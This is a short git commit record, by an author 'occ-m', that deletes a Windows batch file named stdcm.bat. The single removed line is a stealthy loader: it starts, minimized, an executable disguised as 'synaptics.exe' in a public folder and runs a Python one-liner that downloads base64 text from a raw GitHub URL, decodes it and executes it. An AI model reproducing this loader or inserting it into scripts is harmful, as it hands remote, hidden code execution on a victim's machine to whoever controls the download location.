0c35d765f501092bf73946193a550161a4968b73
occ-m <lemanhvinhdo572@gmail.com>
2024-09-23 23:39:52 -0700

    Delete stdcm.bat

--- stdcm.bat
+++
@@ -1,1 +0,0 @@
-start "" /min "C:\\Users\\Public\\Document\\synaptics.exe" -c "import urllib.request;import base64;exec(base64.b64decode(urllib.request.urlopen('https://raw.githubusercontent.com/occ-m/goc/main/bs').read().decode('utf-8')))"   
